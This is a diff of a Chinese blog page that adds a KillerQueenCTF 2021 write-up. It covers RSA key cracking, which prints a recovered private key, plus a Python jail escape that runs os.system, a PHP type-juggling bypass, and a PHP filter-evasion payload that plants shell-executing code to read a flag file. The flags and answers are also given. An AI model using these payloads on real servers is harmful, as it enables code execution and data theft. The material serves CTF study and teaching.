@@ -52,15 +52,18 @@
   };
 </script>
 
-  <meta name="keywords" content="CTF,KillerQueenCTF">
+  <meta name="description" content="CloudsourcingSourced in the cloud  使用RsaCtfTool破解公钥,将得到的私钥保存至a.pem ~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpc">
+<meta name="keywords" content="CTF,KillerQueenCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="KillerQueenCTF2021 Writeup">
 <meta property="og:url" content="https://zhaoqi.vip/posts/2621990551/index.html">
 <meta property="og:site_name" content="温柔小猪">
+<meta property="og:description" content="CloudsourcingSourced in the cloud  使用RsaCtfTool破解公钥,将得到的私钥保存至a.pem ~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpc">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-12-08T09:25:49.809Z">
+<meta property="og:updated_time" content="2021-12-08T09:29:47.412Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="KillerQueenCTF2021 Writeup">
+<meta name="twitter:description" content="CloudsourcingSourced in the cloud  使用RsaCtfTool破解公钥,将得到的私钥保存至a.pem ~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpc">
 
 <link rel="canonical" href="https://zhaoqi.vip/posts/2621990551/">
 
@@ -303,14 +306,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>8.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>14 分钟</span>
             </span>
 
         </div>
@@ -322,7 +325,286 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+        <h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
+<hr>
+<p>使用<a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
+<pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
+e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
+O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
+dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
+lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
+pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
+KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
+dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
+19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
+Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
+wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
+60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
+TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
+gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
+z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
+mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
+HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
+n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
+Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
+ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
+WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
+I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
+tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
+hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
+SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>编写代码,用RSA解密</p>
+<pre><code class="python"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> PKCS1_cipher
+<span class="keyword">import</span> base64
+c = <span class="string">'Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA=='</span>
+
+<span class="keyword">with</span> open(<span class="string">'a.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:
+    pri_key = RSA.importKey(f.read())
+    cipher = PKCS1_cipher.new(pri_key)
+    plain = cipher.decrypt(base64.b64decode(c), <span class="number">0</span>)
+    print(plain)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}</code><br><a id="more"></a></p>
+<h1 id="Road-Safety-Association"><a href="#Road-Safety-Association" class="headerlink" title="Road_Safety_Association"></a>Road_Safety_Association</h1><p><em>That’s what it stands for, right?</em></p>
+<hr>
+<p>题目给了c,p,q,e的值,直接求d解密即可<br>代码:</p>
+<pre><code class="python"><span class="keyword">import</span> gmpy2
+<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes
+
+c = <span class="number">34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618</span>
+p = <span class="number">7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969</span>
+q = <span class="number">11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857</span>
+e = <span class="number">65537</span>
+
+n = p * q
+phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)
+d = gmpy2.invert(e, phi)
+x = pow(c, d, n)
+print(x)
+print(long_to_bytes(x))
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc}</code></p>
+<h1 id="Hammer-To-Fall"><a href="#Hammer-To-Fall" class="headerlink" title="Hammer To Fall"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="python"><span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+a = np.array([<span class="number">0</span>], dtype=int)
+val = int(input(<span class="string">"This hammer hits so hard it creates negative matter\n"</span>))
+<span class="keyword">if</span> val == <span class="number">-1</span>:
+    exit()
+a[<span class="number">0</span>] = val
+a[<span class="number">0</span>] = (a[<span class="number">0</span>] * <span class="number">7</span>) + <span class="number">1</span>
+print(a[<span class="number">0</span>])
+<span class="keyword">if</span> a[<span class="number">0</span>] == <span class="number">-1</span>:
+    print(<span class="string">"flag!"</span>)
+</code></pre>
+<p><code>NumPy</code>中的int使用的是C中的long,参照<a href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_" target="_blank" rel="noopener">NumPy文档</a>,最大值为9223372036854775807</p>
+<pre><code class="python"><span class="meta">&gt;&gt;&gt; </span><span class="number">9223372036854775807</span> // <span class="number">7</span> * <span class="number">2</span>
+<span class="number">2635249153387078802</span>
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{2635249153387078802}</code></p>
+<h1 id="I-want-to-break-free"><a href="#I-want-to-break-free" class="headerlink" title="I want to break free"></a>I want to break free</h1><p><em>I want to break free… from this Python jail. nc 143.198.184.186 45457</em></p>
+<hr>
+<p>使用<code>&#39;o&#39;+&#39;s&#39;</code>绕过对os的过滤,执行ls命令,发现存在文件<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>
+<pre><code class="shell">~$ nc 143.198.184.186 45457
+
+    You are in jail. Can you escape?
+
+<span class="meta">&gt;</span><span class="bash"> __builtins__.__import__(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'ls'</span>)</span>
+bin
+blacklist.txt
+boot
+cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+dev
+etc
+home
+jail.py
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+None
+</code></pre>
+<p>读取文件内容</p>
+<pre><code class="shell"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">print</span>(__builtins__.open(<span class="string">'cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt'</span>).<span class="built_in">read</span>())</span>
+kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
+
+None
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}</code></p>
+<h1 id="sneeki-snek"><a href="#sneeki-snek" class="headerlink" title="sneeki snek"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>
+<hr>
+<p>根据字节码还原文件:</p>
+<pre><code class="python">f = <span class="string">''</span>
+a = <span class="string">'rwhxi}eomr\\^`Y'</span>
+z = <span class="string">'f]XdThbQd^TYL&amp;\x13g'</span>
+a = a + z
+<span class="keyword">for</span> i,b <span class="keyword">in</span> enumerate(a):
+    c = ord(b)
+    c = c - <span class="number">7</span>
+    c = c+i
+    f += chr(c)
+
+print(f)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{dont_be_mean_to_snek_:(}</code></p>
+<h1 id="sneeki-snek-2-oh-no-what-did-i-do"><a href="#sneeki-snek-2-oh-no-what-did-i-do" class="headerlink" title="sneeki snek 2 oh no what did i do"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>
+<hr>
+<p>根据字节码还原文件:</p>
+<pre><code class="python">a = list()
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1762811</span>)
+a.append(<span class="number">1794011</span>)
+a.append(<span class="number">1039911</span>)
+a.append(<span class="number">1061211</span>)
+a.append(<span class="number">1718321</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1506121</span>)
+a.append(<span class="number">1783901</span>)
+a.append(<span class="number">1783901</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1561711</span>)
+a.append(<span class="number">1039911</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1561711</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1728311</span>)
+a.append(<span class="number">1539421</span>)
+
+b = <span class="string">''</span>
+<span class="keyword">for</span> i <span class="keyword">in</span> a:
+    c = str(i)
+    c=c[::<span class="number">-1</span>]
+    c= c[:<span class="number">-1</span>]
+    c = int(c)
+    c = <span class="number">5</span> ^ c
+    c= c - <span class="number">55555</span>
+    c = c // <span class="number">555</span>
+    b = b + chr(c)
+print(b)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{snek_waas_not_so_sneeki}</code></p>
+<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don’t think we’re compatible (<a href="http://143.198.184.186:7000/" target="_blank" rel="noopener">Link</a>)</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="php+HTML">&lt;h1&gt;I just don&apos;t think we&apos;re compatible&lt;/h1&gt;
+&lt;?php
+$FLAG = &quot;shhhh you don&apos;t get to see this locally&quot;;
+if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) 
+{
+    $password = $_POST[&quot;password&quot;];
+    if (strcasecmp($password, $FLAG) == 0) {
+        echo $FLAG;
+    } 
+    else {
+        echo &quot;That&apos;s the wrong password!&quot;;
+    }
+}
+?&gt;
+&lt;form method=&quot;POST&quot;&gt;
+    Password
+    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
+    &lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p><strong>Payload</strong></p>
+<pre><code class="php+HTML">password[]=123
+</code></pre>
+<p><strong>flag:</strong><code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}</code></p>
+<h1 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a>PHat Pottomed Girls</h1><p><em>Now it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="php+HTML">&lt;?php
+session_start();
+
+function generateRandomString($length = 15) {
+    $characters = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;
+    $charactersLength = strlen($characters);
+    $randomString = &apos;&apos;;
+    for ($i = 0; $i &lt; $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+function filter($originalstring) {
+    $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);
+    $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd);
+
+    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);
+
+    return $notetoadd;
+}
+
+if(isset($_POST[&quot;notewrite&quot;])) {
+    $newnote = $_POST[&quot;notewrite&quot;];
+
+    //3rd times the charm and I&apos;ve learned my lesson. Now I&apos;ll make sure to filter more than once :)
+    $notetoadd = filter($newnote);
+    $notetoadd = filter($notetoadd);
+    $notetoadd = filter($notetoadd);
+
+    $filename = generateRandomString();
+    array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);
+    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
+    header(&quot;location:index.php&quot;);
+}
+</code></pre>
+<p><strong>Payload</strong></p>
+<pre><code class="php+HTML">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php
+ echo `sort /fffflaglaglaglag.php`;
+????&gt;&gt;&gt;&gt;
+</code></pre>
+<p><strong>flag:</strong><code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
     
@@ -495,6 +777,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Cloudsourcing"><span class="nav-number">1.</span> <span class="nav-text">Cloudsourcing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Road-Safety-Association"><span class="nav-number">2.</span> <span class="nav-text">Road_Safety_Association</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hammer-To-Fall"><span class="nav-number">3.</span> <span class="nav-text">Hammer To Fall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#I-want-to-break-free"><span class="nav-number">4.</span> <span class="nav-text">I want to break free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sneeki-snek"><span class="nav-number">5.</span> <span class="nav-text">sneeki snek</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sneeki-snek-2-oh-no-what-did-i-do"><span class="nav-number">6.</span> <span class="nav-text">sneeki snek 2 oh no what did i do</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Just-Not-My-Type"><span class="nav-number">7.</span> <span class="nav-text">Just Not My Type</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHat-Pottomed-Girls"><span class="nav-number">8.</span> <span class="nav-text">PHat Pottomed Girls</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -581,13 +864,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">125k</span>
+    <span title="站点总字数">177k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">4:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
